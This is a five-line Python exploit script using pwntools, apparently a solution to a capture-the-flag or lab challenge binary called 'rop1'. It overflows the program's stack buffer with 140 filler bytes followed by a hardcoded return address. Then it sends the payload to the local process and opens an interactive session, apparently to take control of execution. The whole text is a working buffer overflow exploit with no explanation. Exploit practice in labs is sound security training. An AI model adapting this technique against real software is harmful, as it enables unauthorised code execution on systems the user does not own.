from pwn import *
ov="A"*140+p32(0x80484A4)
p=process("./rop1")
p.sendline(ov)
p.interactive()
